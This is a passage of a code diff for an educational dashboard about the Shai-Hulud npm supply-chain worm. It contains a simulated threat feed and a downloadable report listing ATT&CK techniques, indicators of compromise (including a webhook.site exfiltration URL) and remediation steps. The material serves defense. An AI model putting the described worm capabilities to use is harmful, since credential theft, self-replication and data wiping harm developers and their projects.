+                    shai_hulud: 'Triggers automatically during npm install via postinstall and preinstall scripts.',
+                    detection: 'Monitor npm install execution, audit postinstall scripts, implement sandboxing.',
+                    mitigation: 'Use --ignore-scripts flag, review package scripts before installation, use containers.'
+                }
+            };
+
+            const detail = details[techniqueId];
+            if (!detail) return;
+
+            const modal = document.createElement('div');
+            modal.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.9);
+                z-index: 10000;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+                animation: slide-in 0.3s ease;
+            `;
+
+            modal.innerHTML = `
+                <div style="background: var(--bg-secondary); border: 2px solid var(--red-primary); padding: 30px; max-width: 800px; max-height: 90vh; overflow-y: auto; box-shadow: 0 0 50px var(--red-glow);">
+                    <div style="display: flex; justify-content: space-between; align-items: start; margin-bottom: 20px;">
+                        <div>
+                            <div style="color: var(--red-primary); font-weight: 700; font-size: 1.2em; margin-bottom: 5px;">${detail.id}</div>
+                            <div style="color: var(--text-primary); font-size: 1.1em; font-weight: 700;">${detail.technique}</div>
+                            <div style="color: var(--text-secondary); font-size: 0.9em; margin-top: 5px;">TACTIC: ${detail.tactic}</div>
+                        </div>
+                        <button onclick="this.closest('div').closest('div').remove()" style="background: var(--red-dark); border: 1px solid var(--red-primary); color: var(--text-primary); padding: 8px 16px; cursor: pointer; font-family: 'JetBrains Mono', monospace; font-weight: 700;">CLOSE</button>
+                    </div>
+                    
+                    <div style="margin-top: 20px;">
+                        <h3 style="color: var(--red-secondary); font-size: 1.1em; margin-bottom: 10px;">DESCRIPTION</h3>
+                        <p style="color: var(--text-secondary); line-height: 1.6;">${detail.description}</p>
+                    </div>
+
+                    <div style="margin-top: 20px; padding: 15px; background: var(--bg-tertiary); border-left: 4px solid var(--red-primary);">
+                        <h3 style="color: var(--red-primary); font-size: 1em; margin-bottom: 10px;">SHAI-HULUD IMPLEMENTATION</h3>
+                        <p style="color: var(--text-secondary); line-height: 1.6;">${detail.shai_hulud}</p>
+                    </div>
+
+                    <div style="margin-top: 20px;">
+                        <h3 style="color: var(--red-secondary); font-size: 1.1em; margin-bottom: 10px;">DETECTION</h3>
+                        <p style="color: var(--text-secondary); line-height: 1.6;">${detail.detection}</p>
+                    </div>
+
+                    <div style="margin-top: 20px;">
+                        <h3 style="color: var(--red-secondary); font-size: 1.1em; margin-bottom: 10px;">MITIGATION</h3>
+                        <p style="color: var(--text-secondary); line-height: 1.6;">${detail.mitigation}</p>
+                    </div>
+
+                    <div style="margin-top: 25px; padding: 15px; background: var(--bg-primary); border: 1px solid var(--gray-border);">
+                        <strong style="color: var(--text-primary);">📚 Learn More:</strong><br>
+                        <span style="color: var(--text-secondary);">Visit MITRE ATT&CK for complete documentation:<br>
+                        https://attack.mitre.org/techniques/${detail.id.replace('.', '/')}/</span>
+                    </div>
+                </div>
+            `;
+
+            document.body.appendChild(modal);
+            modal.addEventListener('click', function(e) {
+                if (e.target === modal) modal.remove();
+            });
+        }
+
+        // Initialize on page load
+        window.onload = function() {
+            loadProgress();
+            showKeyboardHelp();
+            startThreatFeed();
+        };
+
+        // Live Threat Feed Animation
+        function startThreatFeed() {
+            const feed = document.getElementById('threatFeed');
+            if (!feed) return;
+
+            const messages = [
+                { text: '>>> [INFO] Monitoring npm package registry for anomalous activity...', type: 'normal' },
+                { text: '>>> [SCAN] Package: @types/node-extended - Last update: 2 hours ago', type: 'normal' },
+                { text: '>>> [INFO] GitHub API rate: 4,823/5,000 requests remaining', type: 'success' },
+                { text: '>>> [ALERT] Suspicious workflow detected in repo: project-alpha/.github/workflows/', type: 'warning' },
+                { text: '>>> [SCAN] Analyzing secrets in environment variables...', type: 'normal' },
+                { text: '>>> [WARNING] Potential credential leak detected in commit a7b9c2d', type: 'warning' },
+                { text: '>>> [INFO] TruffleHog scan complete: 0 exposed secrets found', type: 'success' },
+                { text: '>>> [ALERT] Outbound connection to webhook.site blocked', type: 'error' },
+                { text: '>>> [SCAN] Checking 47 repositories for Shai-Hulud indicators...', type: 'normal' },
+                { text: '>>> [INFO] Package integrity check: 312/312 packages verified', type: 'success' },
+                { text: '>>> [WARNING] Unusual npm publish activity from user: dev_user_2481', type: 'warning' },
+                { text: '>>> [INFO] GitHub Actions audit complete: 15 workflows reviewed', type: 'normal' },
+                { text: '>>> [ALERT] Base64-encoded POST detected: investigating...', type: 'warning' },
+                { text: '>>> [SCAN] Monitoring CI/CD pipeline for script injection...', type: 'normal' },
+                { text: '>>> [INFO] All systems nominal - no active threats detected', type: 'success' },
+                { text: '>>> [WARNING] Repository visibility change: private → public [blocked]', type: 'error' },
+                { text: '>>> [SCAN] Dependency tree analysis: scanning 1,523 packages...', type: 'normal' },
+                { text: '>>> [INFO] 2FA enforcement check: 94% compliance', type: 'success' },
+                { text: '>>> [ALERT] Suspicious branch creation detected: "shai-hulud-test"', type: 'error' },
+                { text: '>>> [SCAN] Network traffic analysis: 23 GB outbound (normal)', type: 'normal' }
+            ];
+
+            let index = 2; // Start after initial messages
+
+            setInterval(() => {
+                if (document.getElementById('overview').classList.contains('active')) {
+                    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                    const line = document.createElement('div');
+                    line.className = 'terminal-line ' + randomMsg.type;
+                    line.textContent = randomMsg.text;
+                    line.style.animationDelay = '0s';
+                    feed.appendChild(line);
+                    feed.scrollTop = feed.scrollHeight;
+
+                    // Keep only last 15 messages
+                    while (feed.children.length > 15) {
+                        feed.removeChild(feed.firstChild);
+                    }
+                }
+            }, 3000); // New message every 3 seconds
+        }
+
+        // Keyboard shortcuts for navigation
+        document.addEventListener('keydown', function(e) {
+            // Alt + 1-6 for tab switching
+            if (e.altKey) {
+                switch(e.key) {
+                    case '1':
+                        document.querySelector('[onclick="switchTab(\'overview\')"]').click();
+                        break;
+                    case '2':
+                        document.querySelector('[onclick="switchTab(\'timeline\')"]').click();
+                        break;
+                    case '3':
+                        document.querySelector('[onclick="switchTab(\'mitre\')"]').click();
+                        break;
+                    case '4':
+                        document.querySelector('[onclick="switchTab(\'ioc\')"]').click();
+                        break;
+                    case '5':
+                        document.querySelector('[onclick="switchTab(\'learning\')"]').click();
+                        break;
+                    case '6':
+                        document.querySelector('[onclick="switchTab(\'defense\')"]').click();
+                        break;
+                }
+            }
+        });
+
+        function showKeyboardHelp() {
+            setTimeout(() => {
+                const helpText = document.createElement('div');
+                helpText.style.cssText = `
+                    position: fixed;
+                    bottom: 20px;
+                    right: 20px;
+                    background: var(--bg-secondary);
+                    border: 1px solid var(--red-primary);
+                    padding: 15px;
+                    font-size: 0.8em;
+                    z-index: 1001;
+                    box-shadow: 0 0 20px var(--red-glow);
+                `;
+                helpText.innerHTML = `
+                    <div style="color: var(--red-primary); font-weight: 700; margin-bottom: 5px;">⌨ KEYBOARD SHORTCUTS</div>
+                    <div style="color: var(--text-secondary);">Alt + 1-6: Quick tab navigation</div>
+                    <button onclick="this.parentElement.remove()" style="margin-top: 10px; background: var(--red-dark); border: 1px solid var(--red-primary); color: var(--text-primary); padding: 5px 10px; cursor: pointer; font-family: 'JetBrains Mono', monospace;">GOT IT</button>
+                `;
+                document.body.appendChild(helpText);
+                
+                setTimeout(() => {
+                    if (helpText.parentElement) helpText.remove();
+                }, 10000);
+            }, 2000);
+        }
+
+        // Download Report Function
+        function downloadReport() {
+            const reportContent = `
+╔════════════════════════════════════════════════════════════════╗
+║          SHAI-HULUD THREAT INTELLIGENCE REPORT                 ║
+║          NPM Supply Chain Compromise Analysis                  ║
+║          Generated: ${new Date().toLocaleString()}                       ║
+╚════════════════════════════════════════════════════════════════╝
+
+EXECUTIVE SUMMARY
+═══════════════════════════════════════════════════════════════
+Threat Name: Shai-Hulud Worm
+Threat Type: Self-Replicating Supply Chain Malware
+Target: NPM Ecosystem, JavaScript Developers
+Severity: CRITICAL
+Status: ACTIVE CAMPAIGN
+
+IMPACT STATISTICS
+═══════════════════════════════════════════════════════════════
+• Compromised NPM Packages: 300+
+• Affected Repositories: 25,000+
+• Attack Waves Identified: 2 (Sept 2025, Nov 2025)
+• Infected GitHub Repos: 700+
+
+ATTACK CHARACTERISTICS
+═══════════════════════════════════════════════════════════════
+Initial Access:
+  - Compromised NPM maintainer accounts via phishing
+  - Stolen GitHub Personal Access Tokens (PATs)
+  - Credential reuse and weak authentication
+
+Capabilities:
+  - Credential harvesting using TruffleHog
+  - Self-replication to top 20 packages under victim control
+  - Data exfiltration to public GitHub repos and webhooks
+  - Malicious GitHub Actions workflow injection
+  - Wiper functionality (destroys home directory on failure)
+  - AI-assisted code generation
+
+MITRE ATT&CK MAPPING
+═══════════════════════════════════════════════════════════════
+T1195.002 - Supply Chain Compromise
+T1199     - Trusted Relationship
+T1552.001 - Credentials from Files
+T1005     - Data from Local System
+T1567.002 - Exfiltration Over Web Service
+T1525     - Implant Internal Image
+T1578     - Modify Cloud Compute Infrastructure
+T1485     - Data Destruction
+T1059.004 - Command and Scripting Interpreter
+T1027     - Obfuscated Files or Information
+
+INDICATORS OF COMPROMISE
+═══════════════════════════════════════════════════════════════
+File Indicators:
+  .github/workflows/shai-hulud-workflow.yml
+  setup_bun.js
+  bun_environment.js
+  bundle.js (>3MB)
+  data.json
+
+Repository Indicators:
+  - Public repos named "Shai-Hulud" or "Sha1-Hulud"
+  - Branches named "shai-hulud"
+  - Repos with "Sha1-Hulud: The Second Coming" description
+  - Unexpected private-to-public conversions
+
+Network Indicators:
+  webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7
+  POST requests with double base64 encoding
+
+IMMEDIATE ACTIONS REQUIRED
+═══════════════════════════════════════════════════════════════
+1. CREDENTIAL ROTATION
+   - Immediately rotate ALL GitHub PATs
+   - Rotate all NPM tokens
+   - Rotate AWS, GCP, Azure credentials
+   - Rotate CI/CD secrets
+
+2. PACKAGE REMEDIATION
+   - Scan package-lock.json for compromised packages
+   - Remove infected package versions
+   - Update to verified clean versions
+
+3. REPOSITORY CLEANUP
+   - Delete Shai-Hulud repositories and branches
+   - Remove malicious workflow files
+   - Audit repository visibility changes
+
+4. NETWORK CONTAINMENT
+   - Block webhook.site at perimeter
+   - Monitor for suspicious outbound connections
+   - Isolate affected development systems
+
+PREVENTION MEASURES
+═══════════════════════════════════════════════════════════════
+Authentication:
+  ✓ Enforce mandatory 2FA/MFA on all accounts
+  ✓ Implement hardware security keys (YubiKey)
+  ✓ Use granular, short-lived tokens
+  ✓ Enable GitHub Trusted Publishers
+
+Supply Chain Security:
+  ✓ Review package changes before updates
+  ✓ Commit and review lock files
+  ✓ Implement private NPM registry with approvals
+  ✓ Use dependency scanning tools
+
+Runtime Security:
+  ✓ Sandbox npm installs in containers
+  ✓ Use --ignore-scripts for untrusted packages
+  ✓ Monitor postinstall/preinstall execution
+  ✓ Segment build environments
+
+REFERENCES
+═══════════════════════════════════════════════════════════════
+• MITRE ATT&CK: https://attack.mitre.org
+• NPM Security Advisory: https://npmjs.com/advisories
+• GitHub Security Lab: https://securitylab.github.com
+
+═══════════════════════════════════════════════════════════════
+Report Generated by Shai-Hulud Threat Intelligence Platform
+For educational and defensive purposes only
+═══════════════════════════════════════════════════════════════
+`;
+
+            const blob = new Blob([reportContent], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'shai-hulud-threat-report-' + new Date().toISOString().split('T')[0] + '.txt';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+        }
+
+        // Allow Enter key in IOC checker
+        document.getElementById('packageInput')?.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                checkIOC();
+            }
+        });
+    </script></p></body></html>
